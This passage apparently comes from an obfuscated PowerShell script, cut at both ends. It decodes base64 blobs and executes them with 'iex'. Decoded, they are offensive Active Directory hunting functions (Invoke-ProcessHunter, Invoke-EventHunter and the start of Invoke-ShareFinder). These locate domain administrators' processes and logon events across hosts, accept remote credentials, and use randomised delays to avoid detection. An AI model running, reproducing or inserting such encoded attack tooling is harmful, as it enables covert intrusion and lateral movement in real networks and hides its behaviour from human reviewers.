gICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRUaHJlYWRzCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVidWcnXSkgewogICAgICAgICAgICAkRGVidWdQcmVmZXJlbmNlID0gJ0NvbnRpbnVlJwogICAgICAgIH0KICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFJ1bm5pbmcgSW52b2tlLVByb2Nlc3NIdW50ZXIgd2l0aCBkZWxheSBvZiAkRGVsYXkiCiAgICAgICAgaWYoJERvbWFpbikgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWlucyA9IEAoJERvbWFpbikKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRTZWFyY2hGb3Jlc3QpIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbnMgPSBHZXQtTmV0Rm9yZXN0RG9tYWluIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5OYW1lIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRUYXJnZXREb21haW5zID0gQCggKEdldC1OZXREb21haW4pLm5hbWUgKQogICAgICAgIH0KICAgICAgICBpZighJENvbXB1dGVyTmFtZSkgeyAKICAgICAgICAgICAgaWYoJENvbXB1dGVyRmlsZSkgewogICAgICAgICAgICAgICAgJENvbXB1dGVyTmFtZSA9IEdldC1Db250ZW50IC1QYXRoICRDb21wdXRlckZpbGUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFthcnJheV0kQ29tcHV0ZXJOYW1lID0gQCgpCiAgICAgICAgICAgICAgICBGb3JFYWNoICgkRG9tYWluIGluICRUYXJnZXREb21haW5zKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cyIKICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lICs9IEdldC1OZXRDb21wdXRlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUZpbHRlciAkQ29tcHV0ZXJGaWx0ZXIgLUFEU3BhdGggJENvbXB1dGVyQURTcGF0aAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSAkQ29tcHV0ZXJOYW1lIHwgV2hlcmUtT2JqZWN0IHsgJF8gfSB8IFNvcnQtT2JqZWN0IC1VbmlxdWUgfCBTb3J0LU9iamVjdCB7IEdldC1SYW5kb20gfQogICAgICAgICAgICBpZigkKCRDb21wdXRlck5hbWUuQ291bnQpIC1lcSAwKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAiTm8gaG9zdHMgZm91bmQhIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmKCEkUHJvY2Vzc05hbWUpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiTm8gcHJvY2VzcyBuYW1lIHNwZWNpZmllZCwgYnVpbGRpbmcgYSB0YXJnZXQgdXNlciBzZXQiCiAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEAoKQogICAgICAgICAgICBpZigkVGFyZ2V0U2VydmVyKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJRdWVyeWluZyB0YXJnZXQgc2VydmVyICckVGFyZ2V0U2VydmVyJyBmb3IgbG9jYWwgdXNlcnMiCiAgICAgICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtTmV0TG9jYWxHcm91cCAkVGFyZ2V0U2VydmVyIC1SZWN1cnNlIHwgV2hlcmUtT2JqZWN0IHsoLW5vdCAkXy5Jc0dyb3VwKSAtYW5kICRfLklzRG9tYWluIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgKCRfLkFjY291bnROYW1lKS5zcGxpdCgiLyIpWzFdLnRvTG93ZXIoKQogICAgICAgICAgICAgICAgfSAgfCBXaGVyZS1PYmplY3QgeyRffQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkVXNlck5hbWUpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBVc2luZyB0YXJnZXQgdXNlciAnJFVzZXJOYW1lJy4uLiIKICAgICAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEAoICRVc2VyTmFtZS5Ub0xvd2VyKCkgKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkVXNlckZpbGUpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEdldC1Db250ZW50IC1QYXRoICRVc2VyRmlsZSB8IFdoZXJlLU9iamVjdCB7JF99CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRVc2VyQURTcGF0aCAtb3IgJFVzZXJGaWx0ZXIpIHsKICAgICAgICAgICAgICAgIEZvckVhY2ggKCREb21haW4gaW4gJFRhcmdldERvbWFpbnMpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUXVlcnlpbmcgZG9tYWluICREb21haW4gZm9yIHVzZXJzIgogICAgICAgICAgICAgICAgICAgICRUYXJnZXRVc2VycyArPSBHZXQtTmV0VXNlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3BhdGggJFVzZXJBRFNwYXRoIC1GaWx0ZXIgJFVzZXJGaWx0ZXIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRfLnNhbWFjY291bnRuYW1lCiAgICAgICAgICAgICAgICAgICAgfSAgfCBXaGVyZS1PYmplY3QgeyRffQogICAgICAgICAgICAgICAgfSAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJERvbWFpbiBpbiAkVGFyZ2V0RG9tYWlucykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgdXNlcnMgb2YgZ3JvdXAgJyRHcm91cE5hbWUnIgogICAgICAgICAgICAgICAgICAgICRUYXJnZXRVc2VycyArPSBHZXQtTmV0R3JvdXBNZW1iZXIgLUdyb3VwTmFtZSAkR3JvdXBOYW1lIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlcnwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkXy5NZW1iZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgoLW5vdCAkU2hvd0FsbCkgLWFuZCAoKCEkVGFyZ2V0VXNlcnMpIC1vciAoJFRhcmdldFVzZXJzLkNvdW50IC1lcSAwKSkpIHsKICAgICAgICAgICAgICAgIHRocm93ICJbIV0gTm8gdXNlcnMgZm91bmQgdG8gc2VhcmNoIGZvciEiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIHBhcmFtKCRDb21wdXRlck5hbWUsICRQaW5nLCAkUHJvY2Vzc05hbWUsICRUYXJnZXRVc2VycywgJFJlbW90ZVVzZXJOYW1lLCAkUmVtb3RlUGFzc3dvcmQpCiAgICAgICAgICAgICRVcCA9ICRUcnVlCiAgICAgICAgICAgIGlmKCRQaW5nKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRVcCkgewogICAgICAgICAgICAgICAgaWYoJFJlbW90ZVVzZXJOYW1lIC1hbmQgJFJlbW90ZVBhc3N3b3JkKSB7CiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3NlcyA9IEdldC1OZXRQcm9jZXNzIC1SZW1vdGVVc2VyTmFtZSAkUmVtb3RlVXNlck5hbWUgLVJlbW90ZVBhc3N3b3JkICRSZW1vdGVQYXNzd29yZCAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzZXMgPSBHZXQtTmV0UHJvY2VzcyAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEZvckVhY2ggKCRQcm9jZXNzIGluICRQcm9jZXNzZXMpIHsKICAgICAgICAgICAgICAgICAgICBpZigkUHJvY2Vzc05hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3NOYW1lLnNwbGl0KCIsIikgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFByb2Nlc3MuUHJvY2Vzc05hbWUgLW1hdGNoICRfKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRUYXJnZXRVc2VycyAtY29udGFpbnMgJFByb2Nlc3MuVXNlcikgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRUaHJlYWRzKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHMgPSAkVGhyZWFkcyIKICAgICAgICAgICAgJFNjcmlwdFBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAnUGluZycgPSAkKC1ub3QgJE5vUGluZykKICAgICAgICAgICAgICAgICdQcm9jZXNzTmFtZScgPSAkUHJvY2Vzc05hbWUKICAgICAgICAgICAgICAgICdUYXJnZXRVc2VycycgPSAkVGFyZ2V0VXNlcnMKICAgICAgICAgICAgICAgICdSZW1vdGVVc2VyTmFtZScgPSAkUmVtb3RlVXNlck5hbWUKICAgICAgICAgICAgICAgICdSZW1vdGVQYXNzd29yZCcgPSAkUmVtb3RlUGFzc3dvcmQKICAgICAgICAgICAgfQogICAgICAgICAgICBJbnZva2UtVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIGlmKC1ub3QgJE5vUGluZyAtYW5kICgkQ29tcHV0ZXJOYW1lLmNvdW50IC1uZSAxKSkgewogICAgICAgICAgICAgICAgJFBpbmcgPSB7cGFyYW0oJENvbXB1dGVyTmFtZSkgaWYoVGVzdC1Db25uZWN0aW9uIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtQ291bnQgMSAtUXVpZXQgLUVycm9yQWN0aW9uIFN0b3ApeyRDb21wdXRlck5hbWV9fQogICAgICAgICAgICAgICAgJENvbXB1dGVyTmFtZSA9IEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIC1Ob0ltcG9ydHMgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1TY3JpcHRCbG9jayAkUGluZyAtVGhyZWFkcyAxMDAKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgbnVtYmVyIG9mIGFjdGl2ZSBob3N0czogJCgkQ29tcHV0ZXJOYW1lLmNvdW50KSIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJENvbXB1dGVyTmFtZS5jb3VudCkpIgogICAgICAgICAgICAgICAgJFJlc3VsdCA9IEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRDb21wdXRlciwgJEZhbHNlLCAkUHJvY2Vzc05hbWUsICRUYXJnZXRVc2VycywgJFJlbW90ZVVzZXJOYW1lLCAkUmVtb3RlUGFzc3dvcmQKICAgICAgICAgICAgICAgICRSZXN1bHQKICAgICAgICAgICAgICAgIGlmKCRSZXN1bHQgLWFuZCAkU3RvcE9uU3VjY2VzcykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUYXJnZXQgdXNlci9wcm9jZXNzIGZvdW5kLCByZXR1cm5pbmcgZWFybHkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLUV2ZW50SHVudGVyIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdHMnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbQWxpYXMoJ0hvc3RMaXN0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWxlLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRmlsdGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyQURTcGF0aCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cE5hbWUgPSAnRG9tYWluIEFkbWlucycsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0U2VydmVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckFEU3BhdGgsCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHtUZXN0LVBhdGggLVBhdGggJF8gfSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckZpbGUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW0ludDMyXQogICAgICAgICRTZWFyY2hEYXlzID0gMywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTZWFyY2hGb3Jlc3QsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRUaHJlYWRzCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVidWcnXSkgewogICAgICAgICAgICAkRGVidWdQcmVmZXJlbmNlID0gJ0NvbnRpbnVlJwogICAgICAgIH0KICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFJ1bm5pbmcgSW52b2tlLUV2ZW50SHVudGVyIgogICAgICAgIGlmKCREb21haW4pIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbnMgPSBAKCREb21haW4pCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkU2VhcmNoRm9yZXN0KSB7CiAgICAgICAgICAgICRUYXJnZXREb21haW5zID0gR2V0LU5ldEZvcmVzdERvbWFpbiB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTmFtZSB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWlucyA9IEAoIChHZXQtTmV0RG9tYWluKS5uYW1lICkKICAgICAgICB9CiAgICAgICAgaWYoISRDb21wdXRlck5hbWUpIHsgCiAgICAgICAgICAgIGlmKCRDb21wdXRlckZpbGUpIHsKICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBHZXQtQ29udGVudCAtUGF0aCAkQ29tcHV0ZXJGaWxlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRDb21wdXRlckZpbHRlciAtb3IgJENvbXB1dGVyQURTcGF0aCkgewogICAgICAgICAgICAgICAgW2FycmF5XSRDb21wdXRlck5hbWUgPSBAKCkKICAgICAgICAgICAgICAgIEZvckVhY2ggKCREb21haW4gaW4gJFRhcmdldERvbWFpbnMpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUXVlcnlpbmcgZG9tYWluICREb21haW4gZm9yIGhvc3RzIgogICAgICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgKz0gR2V0LU5ldENvbXB1dGVyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtRmlsdGVyICRDb21wdXRlckZpbHRlciAtQURTcGF0aCAkQ29tcHV0ZXJBRFNwYXRoCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBbYXJyYXldJENvbXB1dGVyTmFtZSA9IEAoKQogICAgICAgICAgICAgICAgRm9yRWFjaCAoJERvbWFpbiBpbiAkVGFyZ2V0RG9tYWlucykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgZG9tYWluIGNvbnRyb2xsZXJzIgogICAgICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgKz0gR2V0LU5ldERvbWFpbkNvbnRyb2xsZXIgLUxEQVAgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5kbnNob3N0bmFtZX0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJENvbXB1dGVyTmFtZSB8IFdoZXJlLU9iamVjdCB7ICRfIH0gfCBTb3J0LU9iamVjdCAtVW5pcXVlIHwgU29ydC1PYmplY3QgeyBHZXQtUmFuZG9tIH0KICAgICAgICAgICAgaWYoJCgkQ29tcHV0ZXJOYW1lLkNvdW50KSAtZXEgMCkgewogICAgICAgICAgICAgICAgdGhyb3cgIk5vIGhvc3RzIGZvdW5kISIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkVGFyZ2V0VXNlcnMgPSBAKCkKICAgICAgICBpZigkVGFyZ2V0U2VydmVyKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlF1ZXJ5aW5nIHRhcmdldCBzZXJ2ZXIgJyRUYXJnZXRTZXJ2ZXInIGZvciBsb2NhbCB1c2VycyIKICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LU5ldExvY2FsR3JvdXAgJFRhcmdldFNlcnZlciAtUmVjdXJzZSB8IFdoZXJlLU9iamVjdCB7KC1ub3QgJF8uSXNHcm91cCkgLWFuZCAkXy5Jc0RvbWFpbiB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgKCRfLkFjY291bnROYW1lKS5zcGxpdCgiLyIpWzFdLnRvTG93ZXIoKQogICAgICAgICAgICB9ICB8IFdoZXJlLU9iamVjdCB7JF99CiAgICAgICAgfQogICAgICAgIGVsc2VpZigkVXNlck5hbWUpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFVzaW5nIHRhcmdldCB1c2VyICckVXNlck5hbWUnLi4uIgogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBAKCAkVXNlck5hbWUuVG9Mb3dlcigpICkKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRVc2VyRmlsZSkgewogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtQ29udGVudCAtUGF0aCAkVXNlckZpbGUgfCBXaGVyZS1PYmplY3QgeyRffQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJFVzZXJBRFNwYXRoIC1vciAkVXNlckZpbHRlcikgewogICAgICAgICAgICBGb3JFYWNoICgkRG9tYWluIGluICRUYXJnZXREb21haW5zKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUXVlcnlpbmcgZG9tYWluICREb21haW4gZm9yIHVzZXJzIgogICAgICAgICAgICAgICAgJFRhcmdldFVzZXJzICs9IEdldC1OZXRVc2VyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtQURTcGF0aCAkVXNlckFEU3BhdGggLUZpbHRlciAkVXNlckZpbHRlciB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkXy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgfSAgfCBXaGVyZS1PYmplY3QgeyRffQogICAgICAgICAgICB9ICAgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBGb3JFYWNoICgkRG9tYWluIGluICRUYXJnZXREb21haW5zKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUXVlcnlpbmcgZG9tYWluICREb21haW4gZm9yIHVzZXJzIG9mIGdyb3VwICckR3JvdXBOYW1lJyIKICAgICAgICAgICAgICAgICRUYXJnZXRVc2VycyArPSBHZXQtTmV0R3JvdXBNZW1iZXIgLUdyb3VwTmFtZSAkR3JvdXBOYW1lIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciB8IEZvcmVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkXy5NZW1iZXJOYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCgoISRUYXJnZXRVc2VycykgLW9yICgkVGFyZ2V0VXNlcnMuQ291bnQgLWVxIDApKSkgewogICAgICAgICAgICB0aHJvdyAiWyFdIE5vIHVzZXJzIGZvdW5kIHRvIHNlYXJjaCBmb3IhIgogICAgICAgIH0KICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgcGFyYW0oJENvbXB1dGVyTmFtZSwgJFBpbmcsICRUYXJnZXRVc2VycywgJFNlYXJjaERheXMpCiAgICAgICAgICAgICRVcCA9ICRUcnVlCiAgICAgICAgICAgIGlmKCRQaW5nKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRVcCkgewogICAgICAgICAgICAgICAgR2V0LVVzZXJFdmVudCAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUV2ZW50VHlwZSAnYWxsJyAtRGF0ZVN0YXJ0IChbRGF0ZVRpbWVdOjpUb2RheS5BZGREYXlzKC0kU2VhcmNoRGF5cykpIHwgV2hlcmUtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0VXNlcnMgLWNvbnRhaW5zICRfLlVzZXJOYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICBpZigkVGhyZWFkcykgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzID0gJFRocmVhZHMiCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ1BpbmcnID0gJCgtbm90ICROb1BpbmcpCiAgICAgICAgICAgICAgICAnVGFyZ2V0VXNlcnMnID0gJFRhcmdldFVzZXJzCiAgICAgICAgICAgICAgICAnU2VhcmNoRGF5cycgPSAkU2VhcmNoRGF5cwogICAgICAgICAgICB9CiAgICAgICAgICAgIEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaWYoLW5vdCAkTm9QaW5nIC1hbmQgKCRDb21wdXRlck5hbWUuY291bnQgLW5lIDEpKSB7CiAgICAgICAgICAgICAgICAkUGluZyA9IHtwYXJhbSgkQ29tcHV0ZXJOYW1lKSBpZihUZXN0LUNvbm5lY3Rpb24gLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1Db3VudCAxIC1RdWlldCAtRXJyb3JBY3Rpb24gU3RvcCl7JENvbXB1dGVyTmFtZX19CiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gSW52b2tlLVRocmVhZGVkRnVuY3Rpb24gLU5vSW1wb3J0cyAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLVNjcmlwdEJsb2NrICRQaW5nIC1UaHJlYWRzIDEwMAogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBudW1iZXIgb2YgYWN0aXZlIGhvc3RzOiAkKCRDb21wdXRlck5hbWUuY291bnQpIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gRW51bWVyYXRpbmcgc2VydmVyICRDb21wdXRlciAoJENvdW50ZXIgb2YgJCgkQ29tcHV0ZXJOYW1lLmNvdW50KSkiCiAgICAgICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLUFyZ3VtZW50TGlzdCAkQ29tcHV0ZXIsICQoLW5vdCAkTm9QaW5nKSwgJFRhcmdldFVzZXJzLCAkU2VhcmNoRGF5cwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLVNoYXJlRmluZGVyIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdHMnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbQWxpYXMoJ0hvc3RMaXN0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWxlLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRmlsdGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyQURTcGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeGNsdWRlU3RhbmRhcmQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZVByaW50LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEV4Y2x1ZGVJUEMsCiAgICAgICAgW1N3aXRjaF